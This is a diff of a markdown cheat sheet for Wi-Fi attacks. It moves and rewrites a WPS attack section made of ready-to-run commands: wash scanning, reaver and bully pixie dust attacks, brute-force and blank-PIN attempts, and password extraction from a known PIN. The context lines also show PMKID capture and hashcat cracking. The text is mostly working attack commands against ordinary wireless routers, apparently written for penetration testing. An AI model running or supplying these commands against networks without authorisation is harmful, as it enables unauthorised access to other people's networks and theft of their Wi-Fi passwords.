@@ -15,6 +15,7 @@ airmon-ng start wlan1
 
 ```bash
 airodump-ng wlan1mon
+airodump-ng wlan1mon --band a #5Ghz scan
 ```
 
 Add -c for specific channel
@@ -25,6 +26,65 @@ Take note of Access Point name, MAC address, channel, and client MAC if applicab
 Write target details to txt file to use with other scripts
 
 `set-target.sh`
+
+### WPS attacks
+
+Scan for WPS-enabled APs
+
+`wps-scan.sh`
+
+```bash
+   wash -i wlan1mon -c $channel
+```
+
+Launch pixie dust attack
+
+`reaver1.sh`
+
+```bash
+   reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
+```
+
+Blank PIN to check for misconfigured APs
+
+`wps-null`
+
+ ```
+reaver -i wlan1mon -b $ap_mac -c $channel -f -N -g 1 -vv -p ''
+ ```
+
+
+Different implementation of a pixie dust attack
+
+`bully1.sh`
+
+```bash
+bully wlan1mon -b $ap_mac -c $channel -e $essid -d -v 4 -F -D -A -C -l 90 -w ~/.bully/
+```
+
+Sequential brute force with checksum brute forcing
+
+`bully2.sh`
+
+```bash
+bully wlan1mon -b $ap_mac -c $channel -S -F -B -v 3
+```
+
+Last resort brute force (slow)
+
+`reaver2.sh`
+
+```bash
+reaver -i wlan1mon -b $ap_mac -c $channel -e $ap_name -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A -s session_$ap_name.wpc
+```
+
+Known PIN to extract password
+
+`wps-pin.sh`
+
+```bash
+reaver -i wlan1mon -b $ap_mac -c $channel -p $pin -N -vv
+```
 
 ### Set Up Monitoring and packet capture
 
@@ -142,72 +202,6 @@ Remove iptables rules, disable IP forwarding bring down the at0 interface
 ifconfig at0 down echo 0 > /proc/sys/net/ipv4/ip_forward iptables -F iptables -t nat -F iptables -P FORWARD DROP
 ```
 
-### WPS pixie dust attacks
-
-Scan for WPS-enabled APs
-
-`wps-scan.sh`
-
-```bash
-   wash -i wlan1mon -c $channel
-```
-
-Launch pixie dust attack
-
-`reaver1.sh`
-
-```bash
-   reaver -i wlan1mon -b $ap_mac -c $channel -K 1 -N -vv
-```
-
-
-More comprehensive attack
-
-`reaver2.sh`
-
-```bash
-reaver -i wlan1mon -b $ap_mac -c $channel -e $essid \
-  -L -N -vv -d 5 -T 0.5 -r 3:15 -g 3 -x 10 -t 5 -w -S -A \
-  -s session_$ap_mac.wpc
-```
-
-For very defensive/rate-limiting APs:
-
-`reaver3.sh`
-
-```bash
-reaver -i wlan1mon -b $ap_mac -c $channel -e $ap_name \
-  -L -N -vv -d 15 -T 1 -r 2:60 -g 5 -x 60 -t 10 -w -S -A \
-  -s session_$ap_name.wpc
-```
-
-### Bully (another pixie dust attack)
-
-`bully1.sh`
-
-```bash
-bully wlanmon -b $ap_mac -c $channel
-```
-
-More comprehensive
-
-`bully2.sh`
-
-```bash
-bully wlan1mon -b $ap_mac -c $channel -e $essid \
-  -d -v 4 -F -D -A -C -l 90 \
-  -w ~/.bully/
-```
-
-
-Known PIN to extract password
-
-`wps-pin.sh`
-
-```bash
-reaver -i wlan1mon -b $ap_mac -c $channel -p $pin -N -vv
-```
-
 ### PMKID capture (clientless WPA2 cracking)
 
 Capture PMKID
@@ -233,3 +227,4 @@ Convert capture to hashcat format
 ```bash
    hashcat -m 22000 hashes.hc22000 wordlist.txt
 ```
+
